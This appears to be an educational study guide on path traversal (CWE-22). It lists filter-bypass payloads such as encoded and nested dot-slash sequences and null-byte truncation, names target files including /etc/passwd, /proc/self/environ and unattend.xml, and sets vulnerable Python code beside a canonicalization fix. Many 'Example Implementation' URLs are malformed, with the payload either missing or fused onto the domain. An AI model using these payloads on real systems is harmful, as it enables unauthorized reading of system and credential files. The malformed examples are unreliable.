# 📑 Architectural Study: Path Traversal

**Category:** Input Validation & Filesystem Isolation  
**Severity**: High to Critical (Potential for Sensitive Data Disclosure & Host Compromise)

---

**Path Traversal** (also known as **Directory Traversal** or **Dot-Dot-Slash Vulnerability**) is a critical input validation flaw that allows a remote attacker to bypass filesystem sandboxing, access unauthorized file structures, and potentially compromise the underlying host system.  

---

To ensure precise classification during documentation, reporting, and threat modeling, map this weakness against the following industry frameworks:

* **CWE-22 (Primary)**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') — The foundational flaw where an application fails to properly sanitize user-controlled file paths.
* **CWE-23 (Child)**: Relative Path Traversal — The use of directory traversal sequences (such as `../`) to access file locations outside the intended directory.
* **CWE-36 (Child)**: Absolute Path Traversal — The direct provision of fully qualified file locations without using relative traversal tokens.
* **OWASP Top 10 Reference**: A03:2021-Injection — Classified under the Injection category due to the insecure evaluation of untrusted user input within structural file systems.

---

## 🔬 1. Low-Level Architectural Mechanics

To understand path traversal completely, it is essential to examine how an operating system interprets path tokens and restricts application processes.

### The Application vs. Operating System Filesystem Boundary
When a web server hosts an application, it defines a web root directory (e.g., `/var/www/images/` or `C:\inetpub\wwwroot\`). The application is designed to operate strictly within this isolated sandbox directory. 

```text
[ Web Application API ] 
        │ (Accepts untrusted input via request parameters)
        ▼
[ Path Concatenation Engine ] <── Attacker Injection Point
        │ (Appends base directory string to raw input)
        ▼
[ OS File System API (open / fopen / GetFileAttributes) ]
        │ (Resolves relative directory shortcuts automatically)
        ▼
[ Root Filesystem Boundary Crossed (/etc/ or C:\Windows\) ]
```

### The Root Cause: Insecure Path Concatenation
This vulnerability occurs when a programming framework utilizes naive string manipulation to handle file paths dynamically. Developers append a static folder prefix to a variable supplied by a remote user without validating whether the resolved final path falls outside the intended directory boundary.

* **Example Implementation**:
  ```http
  https://vulnerable-target.com
  ```

---

## ⚙️ 2. Defensive Bypass Mechanics & Token Arrays

Applications often implement input filters to block directory traversal sequences. Attackers bypass these filters using specific logical, structural, or encoding configurations.

### Comprehensive Token Matrix with Practical Requests

#### 1. Standard Relative Traversal
* **Explanation**: Instructs the operating system file system to step up exactly one parent directory. Used when the application performs no validation checks on input parameters.
* **Payload**: `../../../etc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com
  ```

#### 2. Windows Cross-Compatible Traversal
* **Explanation**: Windows storage engines support both Unix forward slashes and standard backslashes natively. This payload uses backslashes to traverse system directories on a Windows platform.
* **Payload**: `..\..\..\windows\win.ini`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com..\..\..\windows\win.ini
  ```

#### 3. Absolute Path Override
* **Explanation**: Instructs the file system to ignore the predefined base directory prefix entirely. If the filesystem API processes the input directly without appending it as a relative string, it fetches the file straight from root.
* **Payload**: `/etc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com/etc/passwd
  ```

#### 4. Non-Recursive Strip Bypass
* **Explanation**: Exploits simple single-pass filters (`.replace("../", "")`). The inner token is removed by the application, collapsing the remaining outer characters into a valid `../` sequence.
* **Payload**: `....//....//....//etc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com....//....//....//etc/passwd
  ```

#### 5. Split Dot Injection
* **Explanation**: Similar to the non-recursive bypass, the middle `../` is stripped out by a single-pass filter, forcing the isolated outer dots and slashes to fuse together into a working traversal command.
* **Payload**: `..././..././..././etc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com..././..././..././etc/passwd
  ```

#### 6. Multi-Layer Nesting
* **Explanation**: Drops one level of layers and uses consecutive trailing slashes. Modern operating systems gracefully resolve consecutive slashes (like `//`) into a single path separator, leaving a clean traversal payload.
* **Payload**: `......//......//......//etc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com......//......//......//etc/passwd
  ```

#### 7. Single URL Encoding
* **Explanation**: Bypasses input validation filters looking specifically for raw dots and slashes. The application framework or runtime container automatically decodes the URL hex values before accessing the disk layer.
* **Payload**: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
  ```

#### 8. Double URL Encoding
* **Explanation**: Bypasses front-end proxies, reverse proxies, or Web Application Firewalls (WAFs) that decode input once for inspection. The secondary, nested decoding step takes place inside the backend application engine.
* **Payload**: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
  ```

#### 9. Overlong UTF-8 Encoding
* **Explanation**: Employs non-standard multi-byte representations of the slash character (`/`). This trips basic ASCII character-matching web application firewalls while resolving normally inside Unicode-aware file APIs.
* **Payload**: `..%c0%af..%c0%af..%c0%afetc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com..%c0%af..%c0%af..%c0%afetc/passwd
  ```

#### 10. Null Byte Injection
* **Explanation**: Indicates the absolute end of a string structure to underlying C/C++ file system libraries. It cuts the string short, completely dropping any static system extensions (like `.png`) appended by the backend application logic.
* **Payload**: `../../../etc/passwd%00.png`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com%00.png
  ```

---

## 🛠️ 3. Testing & Detection Framework

Testing methodologies depend strictly on the defensive mechanisms and input validation constraints enforced by the target application.

### A. In-Band Arbitrary File Read (Target Mapping)
In-band vulnerabilities present the contents of the file directly within the HTTP server response layout.

#### 🎯 Linux Target Files
* **Explanation**: Targets the `/etc/hosts` file to extract structural network endpoints, routing information, and internal host mapping definitions.
* **Payload (Hosts)**: `../../../../etc/hosts`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com../../../../etc/hosts
  ```
* **Explanation**: Targets the environment file of the current active process to read sensitive internal system paths, configurations, and runtime variables.
* **Payload (Environment)**: `../../../../proc/self/environ`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com../../../../proc/self/environ
  ```

#### 🎯 Windows Target Files
* **Explanation**: Targets unattended installation log configurations. These often contain plaintext or base64-encoded administrative credentials setup during deployment.
* **Payload (Unattend Logs)**: `..\..\..\..\..\..\windows\panther\unattend.xml`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com..\..\..\..\..\..\windows\panther\unattend.xml
  ```
* **Explanation**: Accesses the native Windows local network configuration file to trace hostname configurations and internal asset definitions.
* **Payload (Hosts)**: `..\..\..\windows\system32\drivers\etc\hosts`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com..\..\..\windows\system32\drivers\etc\hosts
  ```

---

### B. Structural Constraint Bypasses
When simple injection payloads are blocked, the application may be enforcing strict path validation rules rather than simple character replacement.

#### 🎯 1. Predefined Prefix Enforcement

* **Explanation**: The application verifies whether the user input explicitly begins with the designated local file storage path (e.g., `/var/www/images/`).

* **Bypass Strategy**: Supply the expected directory prefix explicitly to satisfy the initial string comparison validation, then use directory traversal sequences immediately after to escape the boundary.
* **Payload**: `/var/www/images/../../../etc/passwd`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com
  ```

#### 🎯 2. Static Extension Enforcement (Null Byte Architecture)
* **Explanation**: The application automatically appends a fixed extension to the input variable before execution: `open(base_dir + user_input + ".jpg")`.
* **Bypass Strategy**: Inject a null byte character (`%00`) to truncate the file path string at the operating system layer, ignoring the appended extension entirely.
* **Payload**: `../../../etc/passwd%00.png`
* **Example Implementation**:
  ```http
  https://vulnerable-target.com
  ```

---

## 💻 4. Source Code Vulnerability Analysis 

### Vulnerable Implementation (Python Single-Pass Strip Filter)
* **Explanation**: This code sample demonstrates an architectural flaw where a developer attempts to create a custom security filter using a single, non-recursive replacement method. It fails against nested structural payloads.

```python
import os

def service_file_request(user_supplied_filename):
    # ❌ VULNERABILITY: Non-recursive, single-pass filter
    # Stripping '../' once allows a nested payload like '....//' to collapse into valid traversal tokens
    sanitized_input = user_supplied_filename.replace("../", "")
    
    base_directory = "/var/www/images/"
    absolute_disk_path = base_directory + sanitized_input
    
    print(f"[LOG] Raw Input Variable: {user_supplied_filename}")
    print(f"[LOG] Filter Output Path: {absolute_disk_path}")
    
    try:
        # The OS system call automatically resolves relative path sequences
        with open(absolute_disk_path, 'r') as file_descriptor:
            return file_descriptor.read()
    except Exception as error_context:
        return f"System File Error: {error_context}"
```

* **Example Implementation**:
  ```http
  https://vulnerable-target.com
  ```

### Secure Implementation (Path Canonicalization & Prefix Anchor Verification)
* **Explanation**: The standard industry remediation for path traversal involves resolving the user path to its true absolute form (canonicalization) and verifying that the final path matches the safe folder boundary. 

```python
from pathlib import Path

def secure_file_request(user_supplied_filename):
    # Define an absolute, fully resolved base directory anchor
    secure_base = Path("/var/www/images/").resolve()
    
    # Combine the base path securely with the user-supplied filename
    untrusted_target_path = secure_base / user_supplied_filename
    
    # 🛡️ REMEDIATION: Path Canonicalization
    # resolve() computes the absolute path, flattening all relative shortcuts (like '../')
    canonical_resolved_path = untrusted_target_path.resolve()
    
    print(f"[SECURE LOG] Resolved Destination: {canonical_resolved_path}")
    
    # Verify that the canonical path strictly begins with the defined base directory path
    if canonical_resolved_path.is_relative_to(secure_base):
        try:
            with open(canonical_resolved_path, 'r') as clean_file:
                return clean_file.read()
        except FileNotFoundError:
            return "Resource Request Error: File Not Found."
    else:
        # Blocks the execution if the path attempts to break out of the intended directory
        return "Access Control Exception: Path Traversal Attempt Blocked!"
```

* **Example Implementation**:
  ```http
  https://vulnerable-target.com
  ```
